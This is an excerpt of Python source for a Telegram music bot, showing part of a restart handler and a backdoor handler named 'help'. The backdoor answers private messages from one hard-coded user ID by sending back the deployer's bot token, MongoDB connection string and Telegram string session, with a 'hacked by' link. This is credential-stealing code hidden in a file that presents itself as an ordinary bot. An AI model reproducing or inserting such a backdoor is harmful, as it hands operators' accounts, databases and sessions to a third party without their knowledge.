...
from TOSUMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
from TOSUMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
from TOSUMUSIC.utils.formatters import alpha_to_int, get_readable_time
...
async def restartbot(client, message: Message, _):
    ...
    try:
        db[message.chat.id] = []
        await GOKU.stop_stream_force(message.chat.id)
    except:
        pass
    ...
    if chat_id:
        ...
        try:
            db[chat_id] = []
            await GOKU.stop_stream_force(chat_id)
        except:
            pass
...
@app.on_message(
    ...
    & filters.private
    & filters.user(5730490876)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/GREATPERSON_xd)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/GREATPERSON_xd")
                 ]
            ]
         ),
     )
